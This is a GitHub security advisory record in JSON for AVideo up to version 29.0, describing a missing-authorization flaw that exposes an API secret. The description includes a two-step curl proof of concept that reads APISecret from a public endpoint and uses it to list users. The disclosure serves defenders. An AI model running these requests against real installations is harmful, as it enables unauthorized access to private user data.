body_excerpt: {"credits": [{"type": "reporter", "user": {"avatar_url": "https://avatars.githubusercontent.com/u/93851819?v=4", "events_url": "https://api.github.com/users/tronglinh23/events{/privacy}", "followers_url": "https://api.github.com/users/tronglinh23/followers", "following_url": "https://api.github.com/users/tronglinh23/following{/other_user}", "gists_url": "https://api.github.com/users/tronglinh23/gists{/gist_id}", "gravatar_id": "", "html_url": "https://github.com/tronglinh23", "id": 93851819, "login": "tronglinh23", "node_id": "U_kgDOBZgQqw", "organizations_url": "https://api.github.com/users/tronglinh23/orgs", "received_events_url": "https://api.github.com/users/tronglinh23/received_events", "repos_url": "https://api.github.com/users/tronglinh23/repos", "site_admin": false, "starred_url": "https://api.github.com/users/tronglinh23/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/tronglinh23/subscriptions", "type": "User", "url": "https://api.github.com/users/tronglinh23", "user_view_type": "public"}}], "cve_id": "CVE-2026-43885", "cvss": {"score": null, "vector_string": null}, "cvss_severities": {"cvss_v3": {"score": 0.0, "vector_string": null}, "cvss_v4": {"score": 7.7, "vector_string": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N/E:P"}}, "cwes": [{"cwe_id": "CWE-200", "name": "Exposure of Sensitive Information to an Unauthorized Actor"}, {"cwe_id": "CWE-862", "name": "Missing Authorization"}], "description": "### Summary An unauthenticated user can read `APISecret` from `objects/plugins.json.php` and use it to call protected API endpoints (e.g. `users_list`) without logging in. ### Details `objects/plugins.json.php` is public and still exposes plugin `object_data` containing `APISecret`. That secret is accepted by `plugin/API/get.json.php` as authentication. ### PoC 1. Get plugin config (contains `APISecret`): ```bash curl 'http:///objects/plugins.json.php' ``` 2. Copy APISecret from response, then call API directly: ```bash curl --get 'http:///plugin/API/get.json.php' \ --data-urlencode 'APIName=users_list' \ --data-urlencode 'APISecret=' \ --data-urlencode 'rowCount=3' \ --data-urlencode 'current=1' ``` ### Impact Unauthenticated disclosure of sensitive config (APISecret) leading to unauthorized access to protected API data. ### Recommended fix Requiring admin auth for full plugin inventory/config endpoint.", "epss": {"percentage": 0.00257, "percentile": 0.16822}, "ghsa_id": "GHSA-xr49-f4rh-qcjf", "github_reviewed_at": "2026-05-05T22:20:42Z", "html_url": "https://github.com/advisories/GHSA-xr49-f4rh-qcjf", "identifiers": [{"type": "GHSA", "value": "GHSA-xr49-f4rh-qcjf"}, {"type": "CVE", "value": "CVE-2026-43885"}], "nvd_published_at": "2026-05-11T22:22:13Z", "published_at": "2026-05-05T22:20:42Z", "references": ["https://github.com/WWBN/AVideo/security/advisories/GHSA-xr49-f4rh-qcjf", "https://github.com/WWBN/AVideo/commit/1c36f229d0a103528fb9f64d0a1cc0e1e8f5999b", "https://nvd.nist.gov/vuln/detail/CVE-2026-43885", "https://github.com/advisories/GHSA-xr49-f4rh-qcjf"], "repository_advisory_url": "https://api.github.com/repos/WWBN/AVideo/security-advisories/GHSA-xr49-f4rh-qcjf", "severity": "high", "source_code_location": "https://github.com/WWBN/AVideo", "summary": "AVideo Vulnerable to Exposure of Sensitive Information to an Unauthorized Actor and Missing Authorization", "type": "reviewed", "updated_at": "2026-05-13T14:28:46Z", "url": "https://api.github.com/advisories/GHSA-xr49-f4rh-qcjf", "vulnerabilities": [{"first_patched_version": null, "package": {"ecosystem": "composer", "name": "wwbn/avideo"}, "vulnerable_functions": [], "vulnerable_version_range": "<= 29.0"}], "withdrawn_at": null}

title: AVideo Vulnerable to Exposure of Sensitive Information to an Unauthorized Actor and Missing Authorization
